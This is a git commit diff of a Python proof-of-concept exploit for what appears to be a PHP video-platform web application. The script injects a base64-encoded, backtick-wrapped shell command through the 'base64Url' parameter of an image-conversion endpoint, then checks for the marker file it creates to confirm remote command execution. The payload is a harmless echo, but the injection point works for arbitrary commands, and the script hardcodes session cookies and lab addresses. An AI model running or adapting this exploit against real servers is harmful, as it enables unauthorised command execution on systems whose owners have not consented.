2eb1b28ae7072fd2f4c04e9d3413654b0ed679f0
lishuang <894597649@qq.com>
2020-04-29 14:21:55 +0800

    poc

--- File/poc.py
+++ File/poc.py
@@ -3,7 +3,7 @@ import time
 
 ## 未执行注入之前访问注入文件名
 def check():
-    burp0_url = "http://encoder:8000/objects/thissystemhavebeenexploited1234"
+    burp0_url = "http://192.168.1.9:8889/objects/thissystemhavebeenexploited1234"
     burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581",
                      "_gid": "GA1.1.150033256.1586273581"}
     burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
@@ -14,7 +14,7 @@ def check():
     return a
 
 def poc():
-    burp0_url = "http://encoder:8000/objects/getSpiritsFromVideo.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg"
+    burp0_url = "http://192.168.1.9:8889/objects/getImageMP4.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg"
     burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581",
                      "_gid": "GA1.1.150033256.1586273581"}
     burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
@@ -29,11 +29,12 @@ def poc():
 if __name__ == "__main__":
     time.sleep(100)
     a1 = str(check())
-    poc()
-    time.sleep(10)
+    #print(a1)
+    b = poc()
+    #print(b)
+    time.sleep(5)
     a = str(check())
-    time.sleep(10)
-
+   # print(a)
     if ('200' in a) :
         print('PoC success!')
     else :
